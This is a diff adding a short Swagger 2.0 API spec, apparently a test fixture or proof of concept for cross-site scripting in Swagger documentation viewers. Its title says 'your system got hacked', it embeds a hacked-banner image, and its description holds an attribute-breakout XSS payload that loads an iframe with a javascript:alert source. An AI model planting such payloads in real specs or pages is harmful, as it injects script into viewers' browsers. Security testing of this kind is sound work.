@@ -1,0 +1,8 @@
+swagger: '2.0'
+info:
+  title: your system got hacked
+  description: |
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/26/You_Have_Been_Hacked!.jpg">
+
+
+     "><h1><IFRAME SRC="javascript:alert('XSS');"></IFRAME>">123</h1>
